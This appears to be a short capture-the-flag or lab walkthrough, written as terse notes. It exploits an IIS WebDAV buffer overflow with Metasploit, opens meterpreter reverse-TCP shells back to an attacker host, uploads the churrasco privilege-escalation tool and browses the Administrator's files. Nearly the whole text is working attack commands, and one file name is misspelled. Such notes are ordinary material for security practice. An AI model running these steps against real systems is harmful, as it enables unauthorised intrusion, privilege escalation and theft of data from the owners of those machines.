use exploit/windows/iis/iis_webdav_scstoragepathfromurl
set PAYLOAD windows/meterpreter/reverse_tcp
set RHOST 10.10.10.14
set LHOST 10.10.15.128
exploit

---
# meterpreter 0:
> cd /WINDOWS/TEMP
> upload churrasco.exe

$ msf-mpc Windows 10.10.15.102 1443
$ msfconsole -r windows-meterpreter-staged-reverse-tcp-17433-exe.rc 
# gives meterpreter 1

# meterpreter 0:
> chorrasco.exe payload

# meterpreter 1:
> sessions -i 1
# just open the files at C:\Documents and Settings\Administrator
# and Harrys

